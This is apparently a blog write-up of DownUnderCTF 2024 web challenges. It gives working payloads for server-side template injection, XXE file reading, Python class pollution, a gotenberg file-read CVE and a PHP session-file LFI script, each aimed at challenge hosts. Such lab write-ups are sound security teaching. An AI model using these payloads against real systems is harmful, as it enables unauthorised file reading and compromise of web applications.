<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="DownUnderctf 2024 [WEB]" /><meta name="author" content="H0j3n" /><meta property="og:locale" content="en" /><meta name="description" content="Category : Web" /><meta property="og:description" content="Category : Web" /><link rel="canonical" href="https://h0j3n.github.io/posts/DownUnderCTF-2024/" /><meta property="og:url" content="https://h0j3n.github.io/posts/DownUnderCTF-2024/" /><meta property="og:site_name" content="$(H0j3n)" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-07-08T08:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="DownUnderctf 2024 [WEB]" /><meta name="twitter:site" content="@H0j3n" /><meta name="twitter:creator" content="@H0j3n" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H0j3n"},"dateModified":"2024-07-09T23:34:52+08:00","datePublished":"2024-07-08T08:00:00+08:00","description":"Category : Web","headline":"DownUnderctf 2024 [WEB]","mainEntityOfPage":{"@type":"WebPage","@id":"https://h0j3n.github.io/posts/DownUnderCTF-2024/"},"url":"https://h0j3n.github.io/posts/DownUnderCTF-2024/"}</script><title>DownUnderctf 2024 [WEB] | $(H0j3n)</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="$(H0j3n)"><meta name="application-name" content="$(H0j3n)"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/51261763?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">$(H0j3n)</a></div><div class="site-subtitle font-italic">Knowledge sharing related to Cybersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/H0j3n" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/H0j3n" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>DownUnderctf 2024 [WEB]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>DownUnderctf 2024 [WEB]</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1720396800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 8, 2024 </em> </span> <span> Updated <em class="" data-ts="1720539292" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 9, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> H0j3n </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3266 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><h1 id="category--web">Category : Web</h1><h2 id="table-of-content"><span class="mr-2">Table of Content</span><a href="#table-of-content" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="#web-beginner---parrot-the-emu">parrot the emu</a><li><a href="#web-beginner--zoo-feedback-form">zoo feedback form</a><li><a href="#web--co2">co2</a><li><a href="#web--hah-got-em">hah got em</a><li><a href="#web--sniffy">sniffy</a><li><a href="#web--i-am-confusion">i am confusion</a><li><a href="#web--co2v2">co2v2</a><li><a href="#web--waifu-in-progess">waifu</a><li><a href="#web--prisoner-processor">prisoner processor</a></ul><p>All of the challenge archives can be found <a href="https://github.com/DownUnderCTF/Challenges_2024_Public">here</a></p><h2 id="web-beginner---parrot-the-emu"><span class="mr-2">Web (beginner) : parrot the emu</span><a href="#web-beginner---parrot-the-emu" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image.png" alt="alt text" data-proofer-ignore></p><p>Looking at the source code (app.py), it can clearly be seen that the <code class="language-plaintext highlighter-rouge">user_input</code> is passed directly into the <code class="language-plaintext highlighter-rouge">render_template_string()</code> function.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-9.png" alt="alt text" data-proofer-ignore></p><p>Since our input is passed directly to <code class="language-plaintext highlighter-rouge">render_template_string()</code>, this causes the function to evaluate our input, leading to <strong>Server-Side Template Injection (SSTI)</strong>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-10.png" alt="alt text" data-proofer-ignore></p><p>To get the flag, use the following payload:</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">request</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">_load_form_data</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">"flag"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-11.png" alt="alt text" data-proofer-ignore></p><p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}</code></p><h2 id="web-beginner--zoo-feedback-form"><span class="mr-2">Web (beginner) : zoo feedback form</span><a href="#web-beginner--zoo-feedback-form" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-1.png" alt="alt text" data-proofer-ignore></p><p>The code below shows that the user XML input is passed directly into the <code class="language-plaintext highlighter-rouge">etree.fromstring()</code> function. This means that if an attacker sends a malicious XML payload (for example, an XML External Entity (XXE) injection), the server will process it, potentially leading to data exfiltration.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-12.png" alt="alt text" data-proofer-ignore></p><p>To get the flag, use the following payload:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE kaibro[
    &lt;!ENTITY xxe SYSTEM "file:///app/flag.txt"&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span>
    <span class="nt">&lt;feedback&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/feedback&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-13.png" alt="alt text" data-proofer-ignore></p><p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{emU_say$_he!!0_h0!@_ci@0}</code></p><h2 id="web--co2"><span class="mr-2">Web : co2</span><a href="#web--co2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-2.png" alt="alt text" data-proofer-ignore></p><p>Looking at the source code (routes.py), the only way to get the flag is for the flag variable to be <code class="language-plaintext highlighter-rouge">true</code>.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/get_flag"</span><span class="p">)</span>
<span class="o">@</span><span class="n">login_required</span>
<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">flag</span> <span class="o">==</span> <span class="s">"true"</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"DUCTF{NOT_THE_REAL_FLAG}"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Nope"</span>
</pre></table></code></div></div><p>First, the user needs to register an account and then log in as that user. (There is no issue with the registration and login functionality) After login, the user can view a new feature called <code class="language-plaintext highlighter-rouge">Feedback</code></p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-14.png" alt="alt text" data-proofer-ignore></p><p>Submitting the form will get us the following <code class="language-plaintext highlighter-rouge">request</code> and <code class="language-plaintext highlighter-rouge">response</code>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-15.png" alt="alt text" data-proofer-ignore></p><p>The code used in the feedback function actually has several interesting lines, especially the <code class="language-plaintext highlighter-rouge">comment</code>. When I first read this code, I wondered if it’s possible to perform <strong>prototype pollution</strong> to change the <code class="language-plaintext highlighter-rouge">flag</code> variable to <code class="language-plaintext highlighter-rouge">true</code>.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/save_feedback"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="o">@</span><span class="n">login_required</span>
<span class="k">def</span> <span class="nf">save_feedback</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>
    <span class="n">feedback</span> <span class="o">=</span> <span class="n">Feedback</span><span class="p">()</span>
    <span class="c1"># Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
</span>    <span class="n">merge</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">feedback</span><span class="p">)</span>
    <span class="n">save_feedback_to_disk</span><span class="p">(</span><span class="n">feedback</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"success"</span><span class="p">:</span> <span class="s">"true"</span><span class="p">,</span><span class="s">"flag"</span><span class="p">:</span><span class="n">flag</span><span class="p">}),</span> <span class="mi">200</span>
</pre></table></code></div></div><p>I saw similar lines of codes in <a href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">this</a> article. Thus, the following payload can be use to change the value of global variable <code class="language-plaintext highlighter-rouge">flag</code> to <code class="language-plaintext highlighter-rouge">true</code>.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="p">{</span>
<span class="s">"__class__"</span><span class="p">:{</span>
    <span class="s">"__init__"</span><span class="p">:{</span>
        <span class="s">"__globals__"</span><span class="p">:{</span>
            <span class="s">"flag"</span><span class="p">:</span><span class="s">"true"</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Using the same session cookies, we can retrieve the flag since the global variable <code class="language-plaintext highlighter-rouge">flag</code> has been changed to <code class="language-plaintext highlighter-rouge">true</code>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-16.png" alt="alt text" data-proofer-ignore></p><p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{_cl455_p0lluti0n_ftw_}</code></p><h2 id="web--hah-got-em"><span class="mr-2">Web : hah got em</span><a href="#web--hah-got-em" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-3.png" alt="alt text" data-proofer-ignore></p><p>The file given to us mentions the version of <strong>gotenberg</strong> used, which is <code class="language-plaintext highlighter-rouge">8.0.3</code>.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">FROM</span> <span class="n">gotenberg</span><span class="p">/</span><span class="n">gotenberg</span><span class="p">:</span><span class="m">8.0</span><span class="p">.</span><span class="m">3</span>

<span class="n">COPY</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</pre></table></code></div></div><p>Actually, the latest version of <strong>gotenberg</strong> already <code class="language-plaintext highlighter-rouge">8.8.0</code>. The following are the details of release date for both versions.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">gotenberg</span> <span class="n">v8</span><span class="p">.</span><span class="m">0.3</span> <span class="p">=</span> <span class="n">Februrary</span> <span class="m">2024</span>
<span class="n">gotenberg</span> <span class="n">v8</span><span class="p">.</span><span class="m">8.0</span> <span class="p">=</span> <span class="n">July</span> <span class="m">2024</span>
</pre></table></code></div></div><p>Mhmm… Could there be an issue we can exploit? After going through each version, I noticed valuable information in the next version after <code class="language-plaintext highlighter-rouge">8.0.3</code>, which is <code class="language-plaintext highlighter-rouge">8.1.0</code>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-17.png" alt="alt text" data-proofer-ignore></p><p>Comparing with both version in <a href="https://github.com/gotenberg/gotenberg/compare/v8.0.3...v8.1.0">here</a>, I was lucky to find something fishy at the bottom page which show a test data that just added?</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-18.png" alt="alt text" data-proofer-ignore></p><p>This led me to <a href="https://github.com/gotenberg/gotenberg/issues/261">this</a> GitHub issue, which is assigned with <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23345">CVE-2021-23345</a>. Thus, the following payload works to read the flag using the newly added test data.</p><div class="language-md highlighter-rouge"><div class="code-header"> <span data-label-text="Markdown"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gh"># Payload</span>
<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"\\localhost/etc/flag.txt"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

<span class="gh"># Command</span>
curl --request POST --url https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/html --header 'Content-Type: multipart/form-data' --form files=@index.html -o flag.pdf
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-19.png" alt="alt text" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-20.png" alt="alt text" data-proofer-ignore></p><p>Flag : <code class="language-plaintext highlighter-rouge">DUCTF{dEeZ_r3GeX_cHeCK5_h4h_g0t_eM}</code></p><h2 id="web--sniffy"><span class="mr-2">Web : sniffy</span><a href="#web--sniffy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-4.png" alt="alt text" data-proofer-ignore></p><p>The code in <code class="language-plaintext highlighter-rouge">audio.php</code> show that there is possibility of <strong>Local File Inclusion (LFI)</strong> but it will check the mime content type. With this check, it looks impossible for us to read anything without the right audio content.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="nv">$file</span> <span class="o">=</span> <span class="s1">'audio/'</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'f'</span><span class="p">];</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
	<span class="nb">http_response_code</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span> <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$mime</span> <span class="o">=</span> <span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$mime</span> <span class="o">||</span> <span class="o">!</span><span class="nf">str_starts_with</span><span class="p">(</span><span class="nv">$mime</span><span class="p">,</span> <span class="s1">'audio'</span><span class="p">))</span> <span class="p">{</span>
	<span class="nb">http_response_code</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span> <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: </span><span class="nv">$mime</span><span class="s2">"</span><span class="p">);</span>
<span class="nb">readfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</pre></table></code></div></div><p>How can we read the flag in <code class="language-plaintext highlighter-rouge">$_SESSION['flag']</code>? Could it be related to a PHP issue? After thinking for a while, I realized that if we could read our current session file, we might be able to read the flag!</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]</span> <span class="o">=</span> <span class="no">FLAG</span><span class="p">;</span> <span class="cm">/* Flag is in the session here! */</span>
</pre></table></code></div></div><p>Reading the article in <a href="https://www.a2hosting.com/kb/developer-corner/php/using-php-sessions/">here</a> give me some hint that the session file located in <code class="language-plaintext highlighter-rouge">/tmp</code>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-21.png" alt="alt text" data-proofer-ignore></p><p>But how does <code class="language-plaintext highlighter-rouge">mime_content_type()</code> determine if a file is an audio file or not? Does it check the file signature? Looking into <a href="https://www.php.net/manual/en/function.mime-content-type.php">this</a> documentation, it was mentioned that:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Returns the MIME content type for a file as determined by using information from the magic.mime file. 
</pre></table></code></div></div><p>As I looked for examples of <code class="language-plaintext highlighter-rouge">magic.mime</code>, I discovered <a href="https://github.com/guillermomartinez/filemanager-laravel/blob/master/src/Pqb/FilemanagerLaravel/plugins/rsc/share/magic.mime">this</a> file. After some try and error, I found the following strings that we could use <strong>(but are not limited to)</strong> to identify our file as an audio file, as it checks the string from the <code class="language-plaintext highlighter-rouge">1080-byte</code> position.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>M.K.
M!K!
FLT4
16CN
</pre></table></code></div></div><p>The following script can be use to get the flag.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PHPSESSID"</span><span class="p">:</span><span class="s">"hijack"</span><span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">inject</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="s">"16CN"</span><span class="o">*</span><span class="mi">270</span>
    <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"https://web-sniffy-d9920bbcf9df.2024.ductf.dev/?theme=</span><span class="si">{</span><span class="n">inject</span><span class="si">}</span><span class="s">"</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"https://web-sniffy-d9920bbcf9df.2024.ductf.dev/audio.php?f=../../../../../tmp/sess_hijack"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">403</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
